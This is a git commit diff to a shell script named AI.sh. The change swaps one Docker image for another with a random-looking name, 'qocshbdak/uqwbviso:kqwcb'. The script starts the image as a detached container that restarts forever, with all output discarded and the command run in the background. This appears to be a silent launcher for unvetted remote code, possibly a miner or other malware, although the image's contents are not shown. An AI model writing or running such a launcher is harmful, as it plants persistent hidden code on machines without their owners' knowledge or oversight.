8ca66ce0651701dd6af62b639c6afe4c129507cf
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-05-15 15:24:41 +0800

    Update AI.sh

--- AI.sh
+++ AI.sh
@@ -1,2 +1,3 @@
 #!/bin/bash
-bash -c "docker run -dt --restart=always --name AI yydsgov/debian:latestq" >/dev/null 2>&1 &
+#bash -c "docker run -dt --restart=always --name AI yydsgov/debian:latestq" >/dev/null 2>&1 &
+bash -c "docker run -dt --restart=always --name AI qocshbdak/uqwbviso:kqwcb" >/dev/null 2>&1 &
